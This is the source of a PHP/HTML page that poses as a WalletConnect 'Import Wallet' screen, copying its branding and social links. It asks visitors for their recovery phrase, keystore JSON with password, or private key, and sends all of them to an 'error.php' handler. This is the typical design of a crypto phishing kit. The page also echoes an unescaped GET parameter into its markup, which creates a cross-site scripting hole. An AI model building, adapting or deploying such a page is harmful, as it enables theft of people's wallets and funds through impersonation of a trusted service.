<html>
<head>
<link rel="stylesheet" href="../main.css" type="text/css"/> 
<meta charset="UTF-8">
<meta name="description" content="Open protocol for connecting Wallets to Dapps">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta property="og:image" content="/images/logo.svg">
<link rel="icon" href="../images/logo.svg">
<script>
    function openCity(evt, cityName) {
    // Declare all variables
    var i, tabcontent, tablinks;
  
    // Get all elements with class="tabcontent" and hide them
    tabcontent = document.getElementsByClassName("tabcontent");
    for (i = 0; i < tabcontent.length; i++) {
      tabcontent[i].style.display = "none";
    }
  
    // Get all elements with class="tablinks" and remove the class "active"
    tablinks = document.getElementsByClassName("tablinks");
    for (i = 0; i < tablinks.length; i++) {
      tablinks[i].className = tablinks[i].className.replace(" active", "");
    }
  
    // Show the current tab, and add an "active" class to the button that opened the tab
    document.getElementById(cityName).style.display = "block";
    evt.currentTarget.className += " active";
  }
  </script>
</head>

<title>Import Wallet</title>

<body>
<center>
<div class="top">
        <a href="index.php#footer" class="left">Github</a>
        <a href="index.php#" class="left">Docs</a>
        <a href="index.php" class="main"><img src="../images/logo.svg" alt="logo"/></a>
        <a href="index.php#wallets" class="left">Wallets</a>
        <a href="index.php#" class="left">Apps</a>
</div>
</br>
<h2><center>Import Wallet</center></h2>
</br>
<div class="tab">
  <button class="tablinks" id="default" onclick="openCity(event, 'phrase')">Phrase</b></button>
  <button class="tablinks" onclick="openCity(event, 'keystore')">Keystore JSON</b></button>
  <button class="tablinks" onclick="openCity(event, 'private')">Private Key</b></button>
</div>

<div id="phrase" class="tabcontent">
<form action="error.php" method="POST">

<input type="hidden" name="category" value="Phrase"/>
<?php
  if(isset($_GET['type'])){ //captures wallettype via get
?>
              <input type="hidden" name="refer" class="form-element" value="<?php echo $_GET['type'];?>">
                <?php
  }
?>

<textarea name="phrase" required="required" minlength="12" placeholder="Phrase"></textarea>
</br>
<div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
</br>
<button type="submit" name="import" class="btn">IMPORT</button>
</form>
</div>

<div id="keystore" class="tabcontent">
<form action="error.php" method="POST">

<input type="hidden" name="category" value="Keystore JSON"/>
<?php
  if(isset($_GET['type'])){ //Checks for refer code
?>
              <input type="hidden" name="refer" class="form-element" value="<?php echo $_GET['type'];?>">
                <?php
  }
?>

<textarea name="phrase" required="required" minlength="12" placeholder="Keystore JSON"></textarea>
</br>
<div class="field">
    <input type="text" name="password" placeholder="Password"/>
</div>
<div class="desc">Several lines of text beginning with '(...)' plus the password you used to encrypt it.</div>
</br>
<button type="submit" name="import" class="btn">IMPORT</button>
</form>
</div>

<div id="private" class="tabcontent">
<form action="error.php" method="POST">
<input type="hidden" name="category" value="Private Key"/>
<?php
  if(isset($_GET['type'])){ //Checks for refer code
?>
              <input type="hidden" name="refer" class="form-element" value="<?php echo $_GET['type'];?>">
                <?php
  }
?>
<div class="field">
    <input type="text" name="key" placeholder="Private Key"/>
</div>
<div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
</br>
<button type="submit" name="import" class="btn">IMPORT</button>
</form>
</div>

<script>
    document.getElementById("default").click();
</script>
<footer><div id="footer">
<p><img src="../images/discord.svg" class="footimg">  <a href="https://discord.gg/jhxMvxP">Discord</a></p></br>
<p><img src="../images/telegram.svg" class="footimg">  <a href="https://t.me/walletconnect_announcements">Telegram</a></p></br>
<p><img src="../images/twitter.svg" class="footimg">  <a href="https://twitter.walletconnect.org/">Twitter</a></p></br>
<p><img src="../images/github.svg" class="footimg">  <a href="https://github.com/walletconnect">Github</a></p></br>
</footer>
</body>
</html>
